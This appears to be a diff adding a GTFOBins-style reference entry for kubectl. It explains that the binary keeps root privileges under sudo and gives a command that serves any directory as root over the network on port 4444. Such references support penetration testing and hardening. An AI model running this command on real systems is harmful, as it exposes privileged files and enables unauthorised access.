@@ -1,0 +1,7 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * LFILE=dir_to_serve
+      sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-
+      prefix=/x/
